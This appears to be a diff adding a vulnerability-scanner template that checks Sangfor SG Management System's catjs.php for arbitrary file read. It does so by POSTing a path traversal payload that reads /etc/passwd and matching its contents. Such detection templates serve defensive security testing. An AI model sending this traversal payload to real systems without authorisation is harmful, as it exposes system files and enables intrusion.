@@ -1,0 +1,28 @@
+id: sangfor-sg-management-system-arbitrary-file-read
+info:
+  name: "Sangfor SG Management System catjs.php 任意文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sangfor
+  description: |
+    Detects an arbitrary file read vulnerability in Sangfor SG Management System by attempting to read /etc/passwd.
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/php/catjs.php"
+    body: |
+      ["../../../../../../etc/passwd"]
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
